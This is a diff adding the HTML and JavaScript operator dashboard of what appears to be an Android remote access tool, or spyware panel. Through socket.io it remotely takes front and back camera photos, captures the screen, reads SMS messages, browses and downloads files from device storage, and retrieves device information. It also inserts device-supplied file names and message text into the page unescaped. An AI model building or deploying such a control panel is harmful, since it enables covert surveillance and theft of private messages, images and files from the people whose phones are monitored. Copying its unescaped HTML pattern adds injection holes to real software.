@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Monitoring Dashboard</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .devices-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .device-card {
+            flex: 1;
+            min-width: 250px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+        }
+
+        .device-card.connected {
+            border-left: 4px solid #4CAF50;
+        }
+
+        .device-card.disconnected {
+            border-left: 4px solid #F44336;
+        }
+
+        .device-name {
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .device-status {
+            margin-bottom: 5px;
+        }
+
+        .device-actions {
+            margin-top: 15px;
+        }
+
+        .btn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-right: 5px;
+            margin-bottom: 5px;
+        }
+
+        .btn:hover {
+            background-color: #45a049;
+        }
+
+        .btn.danger {
+            background-color: #F44336;
+        }
+
+        .btn.danger:hover {
+            background-color: #d32f2f;
+        }
+
+        .control-panel {
+            margin-top: 30px;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+
+        .control-panel h2 {
+            margin-top: 0;
+        }
+
+        .response-container {
+            margin-top: 20px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .notification {
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 4px;
+        }
+
+        .notification.success {
+            background-color: #dff0d8;
+            color: #3c763d;
+        }
+
+        .notification.error {
+            background-color: #f2dede;
+            color: #a94442;
+        }
+
+        .notification.info {
+            background-color: #d9edf7;
+            color: #31708f;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 20px;
+        }
+
+        .tab {
+            padding: 10px 15px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+        }
+
+        .tab.active {
+            border-bottom: 2px solid #4CAF50;
+            font-weight: bold;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .image-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .image-container img {
+            max-width: 100%;
+            max-height: 400px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        .file-list {
+            margin-top: 20px;
+        }
+
+        .file-item {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .file-item:last-child {
+            border-bottom: none;
+        }
+
+        .file-name {
+            font-weight: bold;
+        }
+
+        .file-info {
+            color: #666;
+        }
+
+        .sms-list {
+            margin-top: 20px;
+        }
+
+        .sms-item {
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .sms-item:last-child {
+            border-bottom: none;
+        }
+
+        .sms-address {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .sms-date {
+            color: #666;
+            font-size: 0.8em;
+            margin-bottom: 10px;
+        }
+
+        .sms-body {
+            white-space: pre-wrap;
+        }
+
+        /* Device Info Table Styles */
+        .device-info table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+
+        .device-info th, .device-info td {
+            padding: 8px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .device-info td:first-child {
+            font-weight: bold;
+            width: 30%;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>Device Monitoring Dashboard</h1>
+
+    <div class="devices-container" id="devices-container">
+        <!-- Device cards will be dynamically added here -->
+    </div>
+
+    <div class="control-panel">
+        <h2>Device Control</h2>
+        <div class="tabs">
+            <div class="tab active" data-tab="camera">Camera</div>
+            <div class="tab" data-tab="files">File Manager</div>
+            <div class="tab" data-tab="screen">Screen Capture</div>
+            <div class="tab" data-tab="sms">SMS</div>
+        </div>
+
+        <div class="tab-content active" id="camera-tab">
+            <p>Control device camera</p>
+            <button class="btn" id="front-camera-btn">Front Camera</button>
+            <button class="btn" id="back-camera-btn">Back Camera</button>
+            <div class="image-container" id="camera-image-container"></div>
+        </div>
+
+        <div class="tab-content" id="files-tab">
+            <p>Browse device files</p>
+            <div>
+                <input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0">
+                <button class="btn" id="browse-files-btn">Browse</button>
+            </div>
+            <div class="file-list" id="file-list"></div>
+        </div>
+
+        <div class="tab-content" id="screen-tab">
+            <p>Capture device screen</p>
+            <button class="btn" id="capture-screen-btn">Capture Screen</button>
+            <div class="image-container" id="screen-image-container"></div>
+        </div>
+
+        <div class="tab-content" id="sms-tab">
+            <p>Read SMS messages</p>
+            <button class="btn" id="read-sms-btn">Read SMS</button>
+            <div class="sms-list" id="sms-list"></div>
+        </div>
+
+        <div class="response-container" id="response-container">
+            <!-- Responses will be displayed here -->
+        </div>
+    </div>
+</div>
+
+<script>
+    // Initialize socket.io
+    const socket = io();
+
+    // Current selected device
+    let currentDeviceId = null;
+
+    // DOM elements
+    const devicesContainer = document.getElementById('devices-container');
+    const responseContainer = document.getElementById('response-container');
+
+    // Tab switching logic
+    function setupTabs() {
+        const tabs = document.querySelectorAll('.tab');
+        const tabContents = document.querySelectorAll('.tab-content');
+
+        tabs.forEach(tab => {
+            tab.onclick = () => {
+                const tabName = tab.getAttribute('data-tab');
+
+                tabs.forEach(t => t.classList.remove('active'));
+                tabContents.forEach(tc => tc.classList.remove('active'));
+
+                tab.classList.add('active');
+                document.getElementById(`${tabName}-tab`).classList.add('active');
+            };
+        });
+    }
+
+    setupTabs();
+
+    // Socket event handlers
+    socket.on('device_connected', (device) => {
+        addDeviceCard(device);
+        addNotification(`Device ${device.id} connected`, 'success');
+    });
+
+    socket.on('device_disconnected', (device) => {
+        updateDeviceStatus(device.id, 'disconnected');
+        addNotification(`Device ${device.id} disconnected`, 'error');
+    });
+
+    socket.on('device_response', (response) => {
+        handleDeviceResponse(response);
+    });
+
+    // Device management functions
+    function addDeviceCard(device) {
+        const existingCard = document.getElementById(`device-${device.id}`);
+
+        if (existingCard) {
+            updateDeviceStatus(device.id, 'connected');
+            return;
+        }
+
+        const deviceCard = document.createElement('div');
+        deviceCard.className = 'device-card connected';
+        deviceCard.id = `device-${device.id}`;
+
+        deviceCard.innerHTML = `
+            <div class="device-name">${device.id}</div>
+            <div class="device-status">Status: <span class="status">Connected</span></div>
+            <div class="device-status">Last Seen: ${new Date(device.lastSeen).toLocaleString()}</div>
+            <div class="device-actions">
+                <button class="btn select-device-btn" data-device-id="${device.id}">Select</button>
+            </div>
+        `;
+
+        devicesContainer.appendChild(deviceCard);
+
+        deviceCard.querySelector('.select-device-btn').addEventListener('click', () => {
+            selectDevice(device.id);
+        });
+    }
+
+    function updateDeviceStatus(deviceId, status) {
+        const deviceCard = document.getElementById(`device-${deviceId}`);
+        if (deviceCard) {
+            deviceCard.className = `device-card ${status}`;
+            deviceCard.querySelector('.status').textContent = status.charAt(0).toUpperCase() + status.slice(1);
+            deviceCard.querySelector('.device-status:last-child').textContent = `Last Seen: ${new Date().toLocaleString()}`;
+        }
+    }
+
+    function selectDevice(deviceId) {
+        currentDeviceId = deviceId;
+        document.querySelectorAll('.device-card').forEach(card => card.style.border = '1px solid #ddd');
+        const selectedCard = document.getElementById(`device-${deviceId}`);
+        if (selectedCard) selectedCard.style.border = '2px solid #4CAF50';
+        addNotification(`Device ${deviceId} selected`, 'info');
+    }
+
+    function sendCommand(command, params = '') {
+        if (!currentDeviceId) {
+            addNotification('No device selected', 'error');
+            return;
+        }
+        socket.emit('command', { deviceId: currentDeviceId, command: command, params: params });
+        addNotification(`Command sent: ${command}`, 'info');
+    }
+
+    function handleDeviceResponse(response) {
+        const { deviceId, type, data } = response;
+        if (deviceId !== currentDeviceId) return;
+
+        switch (type) {
+            case 'CAMERA_RESPONSE': displayCameraImage(data); break;
+            case 'FILES_RESPONSE': displayFileList(data); break;
+            case 'SCREEN_RESPONSE': displayScreenImage(data); break;
+            case 'SMS_RESPONSE': displaySMSList(data); break;
+            case 'DEVICE_INFO_RESPONSE': displayDeviceInfo(data); break;
+            case 'DOWNLOAD_RESPONSE': handleDownloadResponse(data); break;
+            default: addNotification(`Response: ${type}`, 'info');
+        }
+    }
+
+    function handleDownloadResponse(data) {
+        const parts = data.split(':');
+        if (parts[0] === 'ERROR') {
+            addNotification(`Download Error: ${parts.slice(1).join(':')}`, 'error');
+            return;
+        }
+        const fileName = parts[0];
+        const base64Content = parts[1];
+
+        const link = document.createElement('a');
+        link.href = `data:application/octet-stream;base64,${base64Content}`;
+        link.download = fileName;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        addNotification(`File ${fileName} downloaded successfully`, 'success');
+    }
+
+    function displayDeviceInfo(deviceData) {
+        let infoHtml = '<h3>Device Information</h3><div class="device-info"><table>';
+        const infoPairs = deviceData.split(';');
+        infoPairs.forEach(pair => {
+            if (pair && pair.includes('=')) {
+                const [key, value] = pair.split('=');
+                infoHtml += `<tr><td>${key}</td><td>${value}</td></tr>`;
+            }
+        });
+        infoHtml += '</table></div>';
+
+        if (!document.getElementById('info-tab')) {
+            const tabsContainer = document.querySelector('.tabs');
+            const infoTab = document.createElement('div');
+            infoTab.className = 'tab';
+            infoTab.setAttribute('data-tab', 'info');
+            infoTab.textContent = 'Device Info';
+            tabsContainer.appendChild(infoTab);
+
+            const tabContentsContainer = document.querySelector('.control-panel');
+            const infoTabContent = document.createElement('div');
+            infoTabContent.className = 'tab-content';
+            infoTabContent.id = 'info-tab';
+            tabContentsContainer.appendChild(infoTabContent);
+
+            setupTabs(); // Re-initialize tab listeners
+        }
+
+        const infoTabContent = document.getElementById('info-tab');
+        infoTabContent.innerHTML = infoHtml;
+    }
+
+    function displayCameraImage(imageData) {
+        document.getElementById('camera-image-container').innerHTML = `<img src="data:image/jpeg;base64,${imageData}" alt="Camera">`;
+    }
+
+    function displayFileList(fileData) {
+        const fileList = document.getElementById('file-list');
+        fileList.innerHTML = '';
+        if (!fileData) return;
+        fileData.split(',').forEach(file => {
+            const parts = file.split(':');
+            if (parts.length < 3) return;
+            const fileItem = document.createElement('div');
+            fileItem.className = 'file-item';
+            const fileName = parts[0];
+            const isDir = parts[1] === 'DIR';
+            const fullPath = document.getElementById('file-path').value + (document.getElementById('file-path').value.endsWith('/') ? '' : '/') + fileName;
+
+            fileItem.innerHTML = `
+                <div class="file-name">${fileName}</div>
+                <div class="file-info">
+                    ${parts[1]} | ${formatFileSize(parts[2])}
+                    ${isDir ?
+                        `<button class="btn" onclick="document.getElementById('file-path').value='${fullPath}'; sendCommand('FILES', '${fullPath}')">Open</button>` :
+                        `<button class="btn" onclick="sendCommand('DOWNLOAD', '${fullPath}')">Download</button>`
+                    }
+                </div>
+            `;
+            fileList.appendChild(fileItem);
+        });
+    }
+
+    function displayScreenImage(imageData) {
+        document.getElementById('screen-image-container').innerHTML = `<img src="data:image/jpeg;base64,${imageData}" alt="Screen">`;
+    }
+
+    function displaySMSList(smsData) {
+        const smsList = document.getElementById('sms-list');
+        smsList.innerHTML = '';
+        if (!smsData) return;
+        smsData.split(';').forEach(message => {
+            const parts = message.split(':');
+            if (parts.length < 3) return;
+            const smsItem = document.createElement('div');
+            smsItem.className = 'sms-item';
+            smsItem.innerHTML = `<div class="sms-address">${parts[0]}</div><div class="sms-date">${new Date(parseInt(parts[2])).toLocaleString()}</div><div class="sms-body">${parts[1]}</div>`;
+            smsList.appendChild(smsItem);
+        });
+    }
+
+    function formatFileSize(bytes) {
+        if (!bytes || bytes === '0') return '0 Bytes';
+        const k = 1024;
+        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+        const i = Math.floor(Math.log(bytes) / Math.log(k));
+        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+    }
+
+    function addNotification(message, type) {
+        const notification = document.createElement('div');
+        notification.className = `notification ${type}`;
+        notification.textContent = message;
+        responseContainer.appendChild(notification);
+        responseContainer.scrollTop = responseContainer.scrollHeight;
+        setTimeout(() => notification.remove(), 5000);
+    }
+
+    document.getElementById('front-camera-btn').onclick = () => sendCommand('CAMERA', 'front');
+    document.getElementById('back-camera-btn').onclick = () => sendCommand('CAMERA', 'back');
+    document.getElementById('browse-files-btn').onclick = () => sendCommand('FILES', document.getElementById('file-path').value);
+    document.getElementById('capture-screen-btn').onclick = () => sendCommand('SCREEN');
+    document.getElementById('read-sms-btn').onclick = () => sendCommand('SMS');
+
+    addNotification('Dashboard loaded.', 'info');
+</script>
+</body>
+</html>
